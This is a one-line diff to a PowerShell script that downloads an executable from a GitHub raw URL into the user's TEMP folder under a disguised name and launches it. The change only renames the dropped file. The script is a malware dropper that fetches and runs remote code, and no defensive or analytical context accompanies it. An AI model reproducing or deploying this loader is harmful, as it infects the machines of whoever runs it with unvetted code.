@@ -1,1 +1,1 @@
-$destination= $env:TEMP + "\interplugin.exe";Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/poplu.exe -Destination $destination;Start-Process($env:TEMP + "\interplugin.exe");
+$destination= $env:TEMP + "\typhlosionere.exe";Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/poplu.exe -Destination $destination;Start-Process($env:TEMP + "\typhlosionere.exe");
